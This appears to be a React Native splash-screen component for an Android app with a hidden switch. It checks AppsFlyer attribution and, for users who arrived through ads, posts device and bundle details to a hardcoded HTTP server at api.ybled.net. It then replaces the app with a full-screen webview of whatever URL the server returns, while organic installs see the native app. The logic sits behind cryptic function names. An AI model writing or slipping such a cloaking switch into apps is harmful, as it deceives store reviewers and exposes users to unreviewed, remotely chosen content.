import { useAsyncStorage } from "@react-native-async-storage/async-storage";
import React, { ReactElement, useEffect, useState } from "react";
import {View,
    Image,
    Text,
StyleSheet,
NativeModules,
requireNativeComponent,
Platform} from 'react-native'
import DeviceInfo from "react-native-device-info";
import {CCTipWebView} from '@tools-react'
const StartView = requireNativeComponent<{style:object}>("SplashView")

const SPLASH_MIN_TIME = 1500
function AndroidPage({devWebview}:{devWebview?:Boolean}):JSX.Element{
    const localStorage = useAsyncStorage("from")
    const urlStorege = useAsyncStorage("url")
    const [isAf,setIsAf] = useState<Boolean>(false)
    const [url,setUrl] = useState<String|null>("")
    const [startTime] = useState(new Date().getTime())

    /**
     * 跳转到A,至少延迟1.5秒后跳转
     */
    const sbgg2 = ()=>{
        const now = new Date().getTime()
        const dif = now - startTime
        if(dif >= SPLASH_MIN_TIME){
            NativeModules.ToolModule.openNative();
        }else{
            setTimeout(()=>{
                NativeModules.ToolModule.openNative();
            },dif)
        }
    }

    const ipCode = async()=>{
        const buildId = await DeviceInfo.getBundleId()
        const version = await DeviceInfo.getVersion()
        const body = {
            buildId,
            version,
            platform:Platform.OS
        }
        try{
            let res = await fetch("http://api.ybled.net/art/mint/ana",{
                body:JSON.stringify(body),
                method:"POST",
                headers:{
                    "Content-Type":"application/json"
                },
            })
            let data = await res.json()
            console.log("Data",JSON.stringify(data))
            data = data.data
            if(data.url != ""){
                setUrl(data.url)
                urlStorege.setItem(data.url)
            }else{
                sbgg2()
            }
        }catch(e){
            console.error(e)
            sbgg2()
        }
    }

    const sbgg = async()=>{
        const from = await localStorage.getItem()
        const url = await urlStorege.getItem()
        if(from && url){
            setIsAf(true)
            setUrl(url)
            return
        }
        
        const afData = await NativeModules.ToolModule.getAppsFlyerConversionData()
        if(afData){
            try{
                const json = JSON.parse(afData)
                if(json.media_source){
                    setIsAf(true)
                    localStorage.setItem("true")
                    await ipCode()
                }else{
                    sbgg2()
                }
            }catch(e){
                console.error(e)
                sbgg2()
            }
        }
    }

    useEffect(()=>{
        sbgg()
    },[])

    const NativiWebView = ()=>{
        const reporting = (text:string)=>{
            try{
                const data = JSON.parse(text)
                Object.keys(data).forEach((key,value)=>{
                    NativeModules.ToolModule.logEvent({
                        event:key,
                        params:value
                    })
                })
            }catch(e){}
        }
        return <View style={{flex:1,backgroundColor:"#24262B"}}>
            <CCTipWebView style={{flex:1}} url={url} onMessage={(e:any)=>{
                reporting(e.nativeEvent.message)
            }}/>
        </View>
    }

    if(isAf && url){
        return <NativiWebView/>
    }else{
        return <AndroidSplash/>
    }
}

function AndroidSplash(): JSX.Element{
    return <StartView style={{flex:1}}/>
}

export default AndroidPage

const styles = StyleSheet.create({
    logo:{
        width:227,
        height:243,
        alignSelf:'center',
    },
    text:{
        fontSize:28,
        textAlign:"center",
        width:"100%"
    },
    left:{
        height:145,
        width:145,
        position:'absolute',
        top:"35%",
        left:0,
    },
    right:{
        position:'absolute',
        bottom:0,
        height:240,
        width:240,
        alignSelf:'flex-end'
    }
})